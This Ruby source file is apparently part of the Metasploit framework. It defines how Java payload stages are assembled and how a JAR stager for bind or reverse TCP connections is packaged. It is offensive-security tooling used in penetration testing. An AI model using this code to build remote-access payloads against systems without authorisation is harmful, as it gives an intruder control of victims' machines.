require 'msf/core'

module Msf::Payload::Java

	def generate_stage
		stage = ''
		@class_files.each do |path|
			fd = File.open(File.join( Msf::Config.install_root, "data", "java", path ), "rb")
			data = fd.read(fd.stat.size)
			stage << ([data.length].pack("N") + data)
		end
		stage << [0].pack("N")

		stage
	end

	# This is the same for both bind and reverse tcp depending on the existence
	# of LHOST.  If it's there, this use a reverse connection, if not, bind.
	def tcp_stager_jar(config)
		paths = [
			[ "metasploit", "Payload.class" ],
		]

		jar = Rex::Zip::Jar.new
		paths.each do |path|
			1.upto(path.length - 1) do |idx|
				full = path[0,idx].join("/") + "/"
				if !(jar.entries.map{|e|e.name}.include?(full))
					jar.add_file(full, '')
				end
			end
			fd = File.open(File.join( Msf::Config.install_root, "data", "java", path ), "rb")
			data = fd.read(fd.stat.size)
			jar.add_file(path.join("/"), data)
			fd.close
		end
		jar.build_manifest(:main_class => "metasploit.Payload")
		jar.add_file("metasploit.dat", config)

		jar
	end
end

